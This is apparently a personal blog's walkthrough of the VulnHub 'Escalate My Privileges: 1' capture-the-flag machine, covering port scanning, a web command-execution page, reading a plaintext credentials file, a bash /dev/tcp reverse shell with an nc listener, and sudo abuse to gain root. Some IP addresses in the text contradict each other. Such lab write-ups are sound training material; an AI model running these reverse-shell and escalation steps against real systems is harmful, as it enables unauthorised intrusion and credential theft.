I"ç2<p><strong>Escalate My Privileges: 1</strong> is a challenge created by Akanksha Sachin Verma. This is a write-up of my experience solving this awesome CTF challenge.</p>

<p>With my Attack Machine (<strong>Kali Linux</strong>) and Victim Machine (<strong>Escalate My Privileges: 1</strong>) set up and running, I decided to get down to solving this challenge.</p>

<blockquote>
  <p>Read more about my set up and environment¬†<a href="https://diaryof0x41.wordpress.com/2019/05/25/entry-0x01-my-first-post/">here</a></p>
</blockquote>

<p>I decided to start my journey by noting down the IP address of our victim machine. We are lucky that the author decided to display it directly on the login screen of the CentOS server.</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-12.49.33-am.png" alt="Screen Shot 2020-04-13 at 12.49.33 AM" /></p>

<p>Great! The victim machine has the IP address <code class="language-plaintext highlighter-rouge">192.168.56.120</code>. Let‚Äôs continue with some port scanning (as usual üòè).</p>

<p>I decided to use my trusty <code class="language-plaintext highlighter-rouge">nmap</code>¬†with options enabled to scan¬†<em>all</em> ports and provide details about the service running using the command:¬†<code class="language-plaintext highlighter-rouge">nmap -p- -sV 192.168.56.120</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-7.11.20-pm.png" alt="Screen Shot 2020-04-13 at 7.11.20 PM" /></p>

<p>The <code class="language-plaintext highlighter-rouge">nmap</code> scan revealed a whole bunch of open ports on the victim machine. Now, the first thing that I noticed was port <code class="language-plaintext highlighter-rouge">80</code> and I decided to navigate to the website (<code class="language-plaintext highlighter-rouge">http://192.168.56.102</code>)¬†using <strong>Firefox ESR</strong> as follows:</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-7.15.49-pm.png" alt="Screen Shot 2020-04-13 at 7.15.49 PM" /></p>

<p>Cool! A pretty <code class="language-plaintext highlighter-rouge">index.html</code> webpage which goes well with the theme of the challenge üòé</p>

<p>Whenever, I am faced with a <code class="language-plaintext highlighter-rouge">HTML</code> page, I make it a point to view the webpage source code <strong>before</strong> attempting brute-force using tools like <code class="language-plaintext highlighter-rouge">dirb</code> or <code class="language-plaintext highlighter-rouge">dirbuster</code>. I decided to hit <code class="language-plaintext highlighter-rouge">&lt;CTRL+U&gt;</code> to view the webpage source.</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-7.21.20-pm-e1586791364696.png" alt="Screen Shot 2020-04-13 at 7.21.20 PM" /></p>

<p>Interesting! The <code class="language-plaintext highlighter-rouge">alt</code> attribute in the <code class="language-plaintext highlighter-rouge">img</code> tag has a URL - <code class="language-plaintext highlighter-rouge">http://ip/phpbash.php</code></p>

<p>I decided to check out <code class="language-plaintext highlighter-rouge">http://192.168.56.120/phpbash.php</code> by replacing <code class="language-plaintext highlighter-rouge">ip</code> with the victim machine‚Äôs IP address.</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-7.51.19-pm.png" alt="Screen Shot 2020-04-13 at 7.51.19 PM" /></p>

<p>Oh my God - command execution üò≥</p>

<p>I decided to play with some basic Linux commands to learn more about my privileges.</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-7.54.41-pm.png" alt="Screen Shot 2020-04-13 at 7.54.41 PM" /></p>

<p>Looks like I am <code class="language-plaintext highlighter-rouge">apache</code>.</p>

<p>I decided to check for more users on the victim machine and look for clues. For this purpose, I ran the command: <code class="language-plaintext highlighter-rouge">cd /home</code> to navigate to the <code class="language-plaintext highlighter-rouge">/home</code> directory where I can find other users (if any).</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.00.37-pm.png" alt="Screen Shot 2020-04-13 at 8.00.37 PM" /></p>

<p>Bingo! Looks like there is a user called <code class="language-plaintext highlighter-rouge">armour</code> on the victim machine. I decided to look inside using the command: <code class="language-plaintext highlighter-rouge">ls -lsa armour</code> to also display hidden files (if any).</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.02.28-pm.png" alt="Screen Shot 2020-04-13 at 8.02.28 PM" /></p>

<p>C‚Äômon it is literally right there - <code class="language-plaintext highlighter-rouge">Credentials.txt</code></p>

<p>What does it contain? I decided to find out‚Ä¶</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.07.02-pm.png" alt="Screen Shot 2020-04-13 at 8.07.02 PM" /></p>

<p>The <code class="language-plaintext highlighter-rouge">Credentials.txt</code> file contains the following text:</p>

<p>my password is
md5(rootroot1)</p>

<p>Woohoo! A password‚Ä¶ but how to use it?</p>

<p>Maybe <code class="language-plaintext highlighter-rouge">SSH</code>? Our previous <code class="language-plaintext highlighter-rouge">nmap</code> scan did show that port <code class="language-plaintext highlighter-rouge">22</code> was open. Also, the website did not have a login portal or something similar. I decided to try the <code class="language-plaintext highlighter-rouge">SSH</code> approach.</p>

<p>But first - I decided to compute the <code class="language-plaintext highlighter-rouge">MD5</code> hash of the password string - <code class="language-plaintext highlighter-rouge">rootroot1</code> using the simple Linux command: <code class="language-plaintext highlighter-rouge">echo -n rootroot1 | md5sum</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.22.25-pm.png" alt="Screen Shot 2020-04-13 at 8.22.25 PM" /></p>

<blockquote>
  <p>The <code class="language-plaintext highlighter-rouge">-n</code> option for the <code class="language-plaintext highlighter-rouge">echo</code> command prevents output of the trailing newline</p>
</blockquote>

<p>Great! We have our password!</p>

<p>I decided to try logging into the victim machine as <code class="language-plaintext highlighter-rouge">armour</code> using the command: <code class="language-plaintext highlighter-rouge">ssh armour@192.168.56.120</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.29.01-pm.png" alt="Screen Shot 2020-04-13 at 8.29.01 PM" /></p>

<p>Damn! Not what I had expected!</p>

<p>I decided to go back to the webpage. Maybe I can login to the <code class="language-plaintext highlighter-rouge">armour</code> account directly using the <code class="language-plaintext highlighter-rouge">su</code> Linux command as follows: <code class="language-plaintext highlighter-rouge">su - armour</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.47.58-pm.png" alt="Screen Shot 2020-04-13 at 8.47.58 PM" /></p>

<blockquote>
  <p>Read more about <code class="language-plaintext highlighter-rouge">su</code> vs <code class="language-plaintext highlighter-rouge">sudo</code> <a href="https://www.lifewire.com/switch-user-su-command-3887179">here</a></p>
</blockquote>

<p>Hmm, <code class="language-plaintext highlighter-rouge">Authentication failure</code>.</p>

<p>I decided to explore a different approach - Reverse Shell. Maybe an¬†<em>interactive</em> shell will allow me to input the <code class="language-plaintext highlighter-rouge">MD5</code> password hash and escalate my privileges from <code class="language-plaintext highlighter-rouge">apache</code> to beyond üòé</p>

<p>With my handy <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> by <strong>pentestmonkey</strong>, I decided to proceed by launching <code class="language-plaintext highlighter-rouge">nc -lvp 1010</code> on my attack machine to listen for connections. Then, on the webpage command execution input, I ran the command:</p>

<p><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/192.168.56.119/1010 0&gt;&amp;1</code> where <code class="language-plaintext highlighter-rouge">192.168.56.120</code> is the IP address of attack machine and port <code class="language-plaintext highlighter-rouge">1010</code> is the randomly selected port on which <code class="language-plaintext highlighter-rouge">nc</code> is listening on for connections.</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-8.55.43-pm.png" alt="Screen Shot 2020-04-13 at 8.55.43 PM" /></p>

<p>Lo and behold!</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-9.12.38-pm.png" alt="Screen Shot 2020-04-13 at 9.12.38 PM" /></p>

<p>Still <code class="language-plaintext highlighter-rouge">apache</code> btw!</p>

<p>Now, to login as <code class="language-plaintext highlighter-rouge">armour</code> using the command: <code class="language-plaintext highlighter-rouge">su - armour</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.20.24-pm.png" alt="Screen Shot 2020-04-13 at 10.20.24 PM" /></p>

<p>Woohoo! I am <code class="language-plaintext highlighter-rouge">armour</code></p>

<p>It is important to note that once the password is entered, there is no manual prompt. You just need to type in any command and see üòè</p>

<p>Okay, the next step is to escalate my privileges and capture the flag. But how?</p>

<p>I decided to proceed by checking for <code class="language-plaintext highlighter-rouge">sudo</code> rights for the user <code class="language-plaintext highlighter-rouge">armour</code>. To do this, I ran the command: <code class="language-plaintext highlighter-rouge">sudo -l</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.25.44-pm.png" alt="Screen Shot 2020-04-13 at 10.25.44 PM" /></p>

<p>Bah! Enough is enough! It is time to get a¬†<em>full</em> <code class="language-plaintext highlighter-rouge">tty</code> shell.</p>

<p>I ran my usual ever-wonderful Python <code class="language-plaintext highlighter-rouge">tty</code> command: <code class="language-plaintext highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash");'</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.28.18-pm.png" alt="Screen Shot 2020-04-13 at 10.28.18 PM" /></p>

<p>That‚Äôs when I decided to check the version of Python. After all, Python can‚Äôt betray me üò≥</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.29.48-pm.png" alt="Screen Shot 2020-04-13 at 10.29.48 PM" /></p>

<p>Oh look what we have here!</p>

<p>Python 3.6 - Hurrah!</p>

<p>I decided to try the same Python <code class="language-plaintext highlighter-rouge">tty</code> command using <code class="language-plaintext highlighter-rouge">python3</code> this time as follows: <code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash");'</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.31.22-pm-e1586802718207.png" alt="Screen Shot 2020-04-13 at 10.31.22 PM" /></p>

<p>Well, there you go! Finally!</p>

<p>Back to checking for a chance to exploit <code class="language-plaintext highlighter-rouge">sudo</code> rights using the command: <code class="language-plaintext highlighter-rouge">sudo -l</code></p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.33.32-pm.png" alt="Screen Shot 2020-04-13 at 10.33.32 PM" /></p>

<p>Like a kid in a candy store. Woah!</p>

<p>How about using good ol‚Äô <code class="language-plaintext highlighter-rouge">bash</code>?</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.36.18-pm.png" alt="Screen Shot 2020-04-13 at 10.36.18 PM" /></p>

<p>We did it! We got root! Heck yes!</p>

<p>‚Ä¶Now for the flag üòé</p>

<p><img src="/assets/images/screen-shot-2020-04-13-at-10.38.30-pm.png" alt="Screen Shot 2020-04-13 at 10.38.30 PM" /></p>

<p>Is that <code class="language-plaintext highlighter-rouge">MD5</code>? üòè</p>

<h3 id="my-thoughts">My Thoughts</h3>

<p>That was a great challenge from <a href="https://www.vulnhub.com/author/akanksha-sachin-verma,672/">Akanksha Sachin Verma</a>! I really enjoyed going back to the basics. <strong>Privilege escalation</strong> is one of those areas where practice is everything and this challenge seems to be straightforward enough for a beginner (with boatloads of trial-and-error of course üòÅ)</p>

<p>I am writing a Vulnhub walkthrough after almost 7 months and had to do a LOT of Google-fu and re-read my old material to complete this challenge.</p>

<p>I look forward to solving more challenges in the <a href="https://www.vulnhub.com/series/escalate-my-privileges,291/">Escalate My Privileges</a> series.</p>

<p>If you enjoyed reading this write-up, please check out my other <a href="https://diaryof0x41.wordpress.com/category/vulnhub/">Vulnhub walkthroughs</a>.</p>
:ET